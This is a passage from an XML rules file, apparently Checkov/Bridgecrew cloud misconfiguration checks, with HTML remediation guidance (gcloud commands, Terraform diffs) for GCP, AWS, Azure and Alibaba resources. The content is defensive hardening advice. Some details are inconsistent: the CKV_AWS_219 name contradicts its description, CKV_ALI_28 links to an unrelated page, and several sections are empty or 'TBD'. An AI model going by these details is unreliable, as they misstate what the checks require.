<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/vertex-ai/workbench/create-instance" target="_self">Vertex AI Workbench</a>.</li>
<li>Scroll down to the <em>Networking</em> section and expand.</li>
<li>Locate the <em>External IP</em> dropdown and select <strong>None</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>It's not currently possible to edit a <strong>Vertex AI workbench</strong> network settings to remove or add a public IP.<br/>
To create a private <strong>Vertex AI Workbench</strong> you'll need to specify the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">--no-public-ip</code> command. For example:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name=""># To create an instance from a VmImage name
gcloud beta notebooks instances create example-instance  \
  --vm-image-project=deeplearning-platform-release  \
  --vm-image-name=tf2-2-1-cu101-notebooks-20200110  \
  --machine-type=n1-standard-4  \
  --location=us-central1-b  \
  --no-public-ip
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_notebooks_instance</li>
<li><strong>Field</strong>: no_public_ip</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_notebooks_instance" "public_instance" {
  name = "my-notebook"
  location = "us-west1-a"
  machine_type = "e2-medium"
  vm_image {
    project      = "deeplearning-platform-release"
    image_family = "tf-latest-cpu"

- no_public_ip = false
+ no_public_ip = true
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-workbench-does-not-have-public-ips' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-workbench-does-not-have-public-ips</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-workbench-does-not-have-public-ips' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_95</key>
    <name>Ensure GCP Memorystore for Redis has AUTH enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-memorystore-for-redis-has-auth-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-memorystore-for-redis-has-auth-disabled"></div>GCP Memorystore for Redis has AUTH disabled</div><a aria-label="Skip link to GCP Memorystore for Redis has AUTH disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-memorystore-for-redis-has-auth-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="memorystore-for-redis-has-auth-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-memorystore-for-redis-has-auth-disabled"></div>Memorystore for Redis has AUTH disabled</div><a aria-label="Skip link to Memorystore for Redis has AUTH disabled" class="heading-anchor-icon fa fa-anchor" href="#memorystore-for-redis-has-auth-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><a href="https://cloud.google.com/memorystore/docs/redis/auth-overview" target="_self">AUTH</a> is an optional security feature on Memorystore for Redis that requires incoming connections to authenticate with an AUTH string. Every AUTH string is a Universally Unique Identifier (UUID), and each Redis instance with AUTH enabled has a unique AUTH string.</p>
<p>When you enable the AUTH feature on your Memorystore instance, incoming client connections must authenticate in order to connect. Once a client authenticates with an AUTH string, it remains authenticated for the lifetime of that connection, even if you change the AUTH string.</p>
<p>We recommend that you enble AUTH on your Memorystore for Redis database to protect against unwanted or non-approved connections.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To enable <strong>AUTH</strong> on your Memorystore for Redis database:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/memorystore/redis/instances" target="_self">Memorystore for Redis</a>.</li>
<li>View your instance's <em>Instance details</em> page by clicking on your <strong>Instance ID</strong>.</li>
<li>Select the <strong>EDIT</strong> button.</li>
<li>Scroll to the <em>Security section</em> and select the checkbox for <strong>Enable AUTH</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To enable <strong>AUTH</strong> on your Memorystore for Redis instance execute the following command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">supported_resources</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="supported_resources">gcloud beta redis instances update INSTANCE-ID \
  --enable-auth \
  --region=REGION
</code></pre></div></div>
<p>Replace <strong>INSTANCE-ID</strong> with your Memorystore for Redis instance ID. Replace <strong>REGION</strong> with the region where your Memorystore for Redis database lives.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_redis_instance</li>
<li><strong>Field</strong>: auth_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_redis_instance" "cache" {
  name           = "memory-cache"
  display_name   = "memory cache db"
  tier           = "STANDARD_HA"
  memory_size_gb = 1

- auth_enabled = false
+ auth_enabled = true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-memorystore-for-redis-is-auth-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-memorystore-for-redis-is-auth-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-memorystore-for-redis-is-auth-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_219</key>
    <name>Ensure AWS CodePipeline artifactStore is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-codepipeline-artifactstore-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-code-pipeline-artifact-store-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></div>AWS CodePipeline artifactStore is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS CodePipeline artifactStore is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-codepipeline-artifactstore-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies CodePipeline artifactStores which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your CodePipeline artifactStore  data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_codepipeline"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-codepipeline"></div>Resource: aws_codepipeline</div><a aria-label="Skip link to Resource: aws_codepipeline" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_codepipeline"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-encryption_key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-encryption-key"></div>Arguments: encryption_key</div><a aria-label="Skip link to Arguments: encryption_key" class="heading-anchor-icon fa fa-anchor" href="#arguments-encryption_key"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">resource "aws_codepipeline" "pass" {
  name     = "tf-test-pipeline"
  role_arn = aws_iam_role.codepipeline_role.arn

  artifact_store {
    location = aws_s3_bucket.codepipeline_bucket.bucket
    type     = "S3"

    encryption_key {
      id   = data.aws_kms_alias.s3kmskey.arn
      type = "KMS"
    }
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-codepipeline-artifactstore-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-codepipeline-artifactstore-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-codepipeline-artifactstore-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_253</key>
    <name>Ensure AWS DLM cross-region events are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-dlm-cross-region-events-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-dlm-cross-region-events-are-not-encrypted"></div>AWS DLM cross-region events are not encrypted</div><a aria-label="Skip link to AWS DLM cross-region events are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#aws-dlm-cross-region-events-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-events-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-events-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-events-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_233</key>
    <name>Ensure AWS ACM certificate enables Create before Destroy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-acm-certificate-does-not-enable-create-before-destroy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-acm-certificate-does-not-enable-create-before-destroy"></div>AWS ACM certificate does not enable Create before Destroy</div><a aria-label="Skip link to AWS ACM certificate does not enable Create before Destroy" class="heading-anchor-icon fa fa-anchor" href="#aws-acm-certificate-does-not-enable-create-before-destroy"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>It is recommended to enable create_before_destroy argument inside the resource lifecycle configuration block to avoid a possible outage when the certificate needs to be recreated during an update.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p>CloudFormation creates a new certificate first and then will delete the old one automatically.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_acm_certificate" "example" {
  domain_name       = "example.com"
  validation_method = "DNS"

+ lifecycle {
+   create_before_destroy = true
+ }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-acm-certificate-enables-create-before-destroy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-acm-certificate-enables-create-before-destroy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-acm-certificate-enables-create-before-destroy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_28</key>
    <name>Ensure Alibaba Cloud KMS Key is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-kms-key-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-kms-key-is-disabled"></div>Alibaba Cloud KMS Key is disabled</div><a aria-label="Skip link to Alibaba Cloud KMS Key is disabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-kms-key-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-has-log_disconnections-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-has-log_disconnections-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-has-log_disconnections-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_86</key>
    <name>Ensure GCP cloud build workers are private</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-cloud-build-workers-are-not-private"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-cloud-build-workers-are-not-private"></div>GCP cloud build workers are not private</div><a aria-label="Skip link to GCP cloud build workers are not private" class="heading-anchor-icon fa fa-anchor" href="#gcp-cloud-build-workers-are-not-private"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-cloud-build-workers-are-private' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-cloud-build-workers-are-private</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-cloud-build-workers-are-private' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_87</key>
    <name>Ensure Azure Security Center Defender set to On for Key Vault</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-security-center-defender-set-to-off-for-key-vault"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-security-center-defender-set-to-off-for-key-vault"></div>Azure Security Center Defender set to Off for Key Vault</div><a aria-label="Skip link to Azure Security Center Defender set to Off for Key Vault" class="heading-anchor-icon fa fa-anchor" href="#azure-security-center-defender-set-to-off-for-key-vault"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded).<br/>
Azure Defender detects unusual and potentially harmful attempts to access or exploit Key Vault accounts. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_subscription_pricing</li>
<li><strong>Argument:</strong> resource_type - (Required) The resource type this setting affects. Ensure that <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">KeyVaults</code> is declared to pass this check.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
  tier          = "Standard"
  resource_type = "AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-key-vault' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-key-vault</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-key-vault' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_37</key>
    <name>Ensure Alibaba RDS instance has log_connections enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-rds-instance-has-log_connections-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-rds-instance-has-log-connections-disabled"></div>Alibaba RDS instance has log_connections disabled</div><a aria-label="Skip link to Alibaba RDS instance has log_connections disabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-rds-instance-has-log_connections-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-rds-instance-has-log_connections-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-rds-instance-has-log_connections-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-rds-instance-has-log_connections-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_91</key>
    <name>Ensure only SSL are enabled for cache for Redis</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-only-ssl-are-enabled-for-cache-for-redis"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-only-ssl-are-enabled-for-cache-for-redis"></div>Not only SSL are enabled for cache for Redis</div><a aria-label="Skip link to Not only SSL are enabled for cache for Redis" class="heading-anchor-icon fa fa-anchor" href="#not-only-ssl-are-enabled-for-cache-for-redis"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_redis_cache</li>
<li><strong>Argument:</strong> enable_non_ssl_port</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_redis_cache" "example" {
                      ...
 +                    enable_non_ssl_port = false
                      ...
                    }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-only-ssl-are-enabled-for-cache-for-redis' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-only-ssl-are-enabled-for-cache-for-redis</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-only-ssl-are-enabled-for-cache-for-redis' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_14</key>
    <name>Ensure Cloud SQL database instances have backup configuration enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloud-sql-database-instances-do-not-have-backup-configuration-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-sql-database-instances-do-not-have-backup-configuration-enabled"></div>Cloud SQL database instances do not have backup configuration enabled</div><a aria-label="Skip link to Cloud SQL database instances do not have backup configuration enabled" class="heading-anchor-icon fa fa-anchor" href="#cloud-sql-database-instances-do-not-have-backup-configuration-enabled"></a></h1>
